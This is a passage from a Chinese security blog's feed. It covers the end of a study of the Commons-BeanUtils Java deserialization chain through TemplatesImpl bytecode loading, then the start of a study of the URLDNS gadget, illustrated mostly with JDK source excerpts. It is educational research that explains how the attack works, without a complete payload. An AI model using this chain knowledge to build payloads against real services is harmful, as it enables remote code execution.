+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransletClassLoader(ObjectFactory.&lt;span style="color:#a6e22e">findClassLoader&lt;/span>(),_tfactory.&lt;span style="color:#a6e22e">getExternalExtensionsMap&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> });
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> classCount &lt;span style="color:#f92672">=&lt;/span> _bytecodes.&lt;span style="color:#a6e22e">length&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _class &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> Class&lt;span style="color:#f92672">[&lt;/span>classCount&lt;span style="color:#f92672">]&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (classCount &lt;span style="color:#f92672">&amp;gt;&lt;/span> 1) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _auxClasses &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> HashMap&lt;span style="color:#f92672">&amp;lt;&amp;gt;&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> (&lt;span style="color:#66d9ef">int&lt;/span> i &lt;span style="color:#f92672">=&lt;/span> 0; i &lt;span style="color:#f92672">&amp;lt;&lt;/span> classCount; i&lt;span style="color:#f92672">++&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _class&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> loader.&lt;span style="color:#a6e22e">defineClass&lt;/span>(_bytecodes&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">final&lt;/span> Class superClass &lt;span style="color:#f92672">=&lt;/span> _class&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>.&lt;span style="color:#a6e22e">getSuperclass&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Check if this is the main class&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (superClass.&lt;span style="color:#a6e22e">getName&lt;/span>().&lt;span style="color:#a6e22e">equals&lt;/span>(ABSTRACT_TRANSLET)) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _transletIndex &lt;span style="color:#f92672">=&lt;/span> i;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _auxClasses.&lt;span style="color:#a6e22e">put&lt;/span>(_class&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>.&lt;span style="color:#a6e22e">getName&lt;/span>(), _class&lt;span style="color:#f92672">[&lt;/span>i&lt;span style="color:#f92672">]&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (_transletIndex &lt;span style="color:#f92672">&amp;lt;&lt;/span> 0) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ErrorMsg err&lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg(ErrorMsg.&lt;span style="color:#a6e22e">NO_MAIN_TRANSLET_ERR&lt;/span>, _name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException(err.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (ClassFormatError e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg(ErrorMsg.&lt;span style="color:#a6e22e">TRANSLET_CLASS_ERR&lt;/span>, _name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException(err.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">catch&lt;/span> (LinkageError e) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ErrorMsg err &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> ErrorMsg(ErrorMsg.&lt;span style="color:#a6e22e">TRANSLET_OBJECT_ERR&lt;/span>, _name);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">throw&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> TransformerConfigurationException(err.&lt;span style="color:#a6e22e">toString&lt;/span>());
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>所以可以总结:&lt;code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&lt;/code>的&lt;code>_bytecodes&lt;/code>属性可以包含类的字节码，通过&lt;code>newTransformer&lt;/code>方法可以调用字节码对应类的构造函数或者静态函数。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">TemplatesImpl&lt;/span> &lt;span style="color:#66d9ef">implements&lt;/span> Templates, Serializable {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> serialVersionUID &lt;span style="color:#f92672">=&lt;/span> 673094361519270707L;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">final&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String DESERIALIZE_TRANSLET &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;jdk.xml.enableTemplatesImplDeserialization&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Name of the superclass of all translets. This is needed to * determine which, among all classes comprising a translet, * is the main one. */&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> String ABSTRACT_TRANSLET
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&amp;#34;&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Name of the main class or default name if unknown. */&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> String _name &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * Contains the actual class definition for the translet class and * any auxiliary classes. */&lt;/span> &lt;span style="color:#66d9ef">private&lt;/span> &lt;span style="color:#66d9ef">byte&lt;/span>&lt;span style="color:#f92672">[][]&lt;/span> _bytecodes &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>总结一下过程：PriorityQueue对象在反序列化过程中会触发排序，调用comparator.compare，在BeanComparator.compare方法中会尝试获取类的property对应的成员的值，其方法是通过尝试获取成员值对应的getter方法，而后调用这个getter方法。&lt;/p>
+&lt;p>而TemplatesImpl类的_bytecodes可以存储字节码并且可以通过newTransformer方法调用这个字节码对应类的构造函数或者静态方法，TemplatesImpl类的getOutputProperties方法会调用newTransformer方法。&lt;/p>
+&lt;p>而getOutputProperties在规范中对应于outputProperties的getter方法，最终构成反序列化链。&lt;/p>
+&lt;p>&lt;strong>参考链接&lt;/strong>&lt;/p>
+&lt;blockquote>
+&lt;p>
+&lt;a href="https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html" target="_blank">https://www.leavesongs.com/PENETRATION/commons-beanutils-without-commons-collections.html&lt;/a>&lt;/p>
+&lt;/blockquote>
+&lt;p>创建于2024-01-11&lt;/p>
+&lt;p>&lt;strong>Created at 2024-01-12T14:32:08+08:00&lt;/strong>&lt;/p></description></item><item><title>JAVA URL DNS 研究</title><link>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</link><pubDate>Mon, 08 Jan 2024 16:57:37 +0800</pubDate><guid>https://www.ch35tnut.site/zh-cn/research/web/java-deserialization/urldns/</guid><description>&lt;p>&lt;strong>前言&lt;/strong>&lt;/p>
+&lt;p>初步入门java反序列化学习，做一个学习记录，水一篇文章。如果有问题可以邮件：got_
+&lt;a href="mailto:whipper.0p@icloud.com">whipper.0p@icloud.com&lt;/a>&lt;/p>
+&lt;h4 id="url类dns请求">URL类DNS请求&lt;/h4>
+&lt;p>使用URL.equals会发起DNS请求&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">class&lt;/span> &lt;span style="color:#a6e22e">urltest&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(String&lt;span style="color:#f92672">[]&lt;/span> args) &lt;span style="color:#66d9ef">throws&lt;/span> MalformedURLException {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(&lt;span style="color:#e6db74">&amp;#34;hello &amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> URL u &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL(&lt;span style="color:#e6db74">&amp;#34;http://www.baidu.com&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> URL u1 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> URL(&lt;span style="color:#e6db74">&amp;#34;http://www.baidu.com&amp;#34;&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> System.&lt;span style="color:#a6e22e">out&lt;/span>.&lt;span style="color:#a6e22e">println&lt;/span>(u.&lt;span style="color:#a6e22e">equals&lt;/span>(u1));
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>
+&lt;img alt="" src="https://www.ch35tnut.site/images/research/web/java-deserialization/urldns.zh-cn.assets/2.png" />&lt;/p>
+&lt;p>跟进代码，equals代码如下，&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">equals&lt;/span>(URL u1, URL u2) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String ref1 &lt;span style="color:#f92672">=&lt;/span> u1.&lt;span style="color:#a6e22e">getRef&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String ref2 &lt;span style="color:#f92672">=&lt;/span> u2.&lt;span style="color:#a6e22e">getRef&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> (ref1 &lt;span style="color:#f92672">==&lt;/span> ref2 &lt;span style="color:#f92672">||&lt;/span> (ref1 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> ref1.&lt;span style="color:#a6e22e">equals&lt;/span>(ref2))) &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> sameFile(u1, u2);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>判断reference是否相同，而后使用sameFile函数，sameFile函数会查看其协议、uri、端口、主机是否相等。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">sameFile&lt;/span>(URL u1, URL u2) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Compare the protocols.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>((u1.&lt;span style="color:#a6e22e">getProtocol&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> u2.&lt;span style="color:#a6e22e">getProtocol&lt;/span>()) &lt;span style="color:#f92672">||&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (u1.&lt;span style="color:#a6e22e">getProtocol&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> u1.&lt;span style="color:#a6e22e">getProtocol&lt;/span>().&lt;span style="color:#a6e22e">equalsIgnoreCase&lt;/span>(u2.&lt;span style="color:#a6e22e">getProtocol&lt;/span>()))))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Compare the files.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>(u1.&lt;span style="color:#a6e22e">getFile&lt;/span>() &lt;span style="color:#f92672">==&lt;/span> u2.&lt;span style="color:#a6e22e">getFile&lt;/span>() &lt;span style="color:#f92672">||&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (u1.&lt;span style="color:#a6e22e">getFile&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> u1.&lt;span style="color:#a6e22e">getFile&lt;/span>().&lt;span style="color:#a6e22e">equals&lt;/span>(u2.&lt;span style="color:#a6e22e">getFile&lt;/span>()))))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Compare the ports.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> port1, port2;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port1 &lt;span style="color:#f92672">=&lt;/span> (u1.&lt;span style="color:#a6e22e">getPort&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1) &lt;span style="color:#f92672">?&lt;/span> u1.&lt;span style="color:#a6e22e">getPort&lt;/span>() : u1.&lt;span style="color:#a6e22e">handler&lt;/span>.&lt;span style="color:#a6e22e">getDefaultPort&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> port2 &lt;span style="color:#f92672">=&lt;/span> (u2.&lt;span style="color:#a6e22e">getPort&lt;/span>() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1) &lt;span style="color:#f92672">?&lt;/span> u2.&lt;span style="color:#a6e22e">getPort&lt;/span>() : u2.&lt;span style="color:#a6e22e">handler&lt;/span>.&lt;span style="color:#a6e22e">getDefaultPort&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (port1 &lt;span style="color:#f92672">!=&lt;/span> port2)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Compare the hosts.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#f92672">!&lt;/span>hostsEqual(u1, u2))
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">false&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">true&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>hostsEqual方法中会调用getHostAddress方法，getHostAddress方法会通过InetAddress.getByName函数获取到域名对应的IP地址，触发DNS解析&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">boolean&lt;/span> &lt;span style="color:#a6e22e">hostsEqual&lt;/span>(URL u1, URL u2) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> InetAddress a1 &lt;span style="color:#f92672">=&lt;/span> getHostAddress(u1);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> InetAddress a2 &lt;span style="color:#f92672">=&lt;/span> getHostAddress(u2);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> InetAddress &lt;span style="color:#a6e22e">getHostAddress&lt;/span>(URL u) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (u.&lt;span style="color:#a6e22e">hostAddress&lt;/span> &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> u.&lt;span style="color:#a6e22e">hostAddress&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String host &lt;span style="color:#f92672">=&lt;/span> u.&lt;span style="color:#a6e22e">getHost&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (host &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span> &lt;span style="color:#f92672">||&lt;/span> host.&lt;span style="color:#a6e22e">isEmpty&lt;/span>()) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> u.&lt;span style="color:#a6e22e">hostAddress&lt;/span> &lt;span style="color:#f92672">=&lt;/span> InetAddress.&lt;span style="color:#a6e22e">getByName&lt;/span>(host);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (UnknownHostException ex) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">catch&lt;/span> (SecurityException se) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> u.&lt;span style="color:#a6e22e">hostAddress&lt;/span>;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>同样的URL类中的hashCode也会触发DNS请求，通过getHostAddress获取到IP地址，需要注意的是其中hashCode会被缓存&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">public&lt;/span> &lt;span style="color:#66d9ef">synchronized&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">hashCode&lt;/span>() {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (hashCode &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>1)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> hashCode;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> hashCode &lt;span style="color:#f92672">=&lt;/span> handler.&lt;span style="color:#a6e22e">hashCode&lt;/span>(&lt;span style="color:#66d9ef">this&lt;/span>);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> hashCode;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">protected&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">hashCode&lt;/span>(URL u) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">int&lt;/span> h &lt;span style="color:#f92672">=&lt;/span> 0;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Generate the protocol part.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String protocol &lt;span style="color:#f92672">=&lt;/span> u.&lt;span style="color:#a6e22e">getProtocol&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (protocol &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> h &lt;span style="color:#f92672">+=&lt;/span> protocol.&lt;span style="color:#a6e22e">hashCode&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Generate the host part.&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> InetAddress addr &lt;span style="color:#f92672">=&lt;/span> getHostAddress(u);
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (addr &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>) {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> h &lt;span style="color:#f92672">+=&lt;/span> addr.&lt;span style="color:#a6e22e">hashCode&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> } &lt;span style="color:#66d9ef">else&lt;/span> {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> String host &lt;span style="color:#f92672">=&lt;/span> u.&lt;span style="color:#a6e22e">getHost&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> (host &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#66d9ef">null&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> h &lt;span style="color:#f92672">+=&lt;/span> host.&lt;span style="color:#a6e22e">toLowerCase&lt;/span>().&lt;span style="color:#a6e22e">hashCode&lt;/span>();
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>通过调用URL类的equals和hashCode方法即可触发DNS请求&lt;/p>
+&lt;h4 id="hashmap原理">HashMap原理&lt;/h4>
+&lt;p>&lt;strong>数据结构&lt;/strong>&lt;/p>
+&lt;p>HashMap采用数组+链表方式存储键值对，其中链表为单向链表&lt;/p>
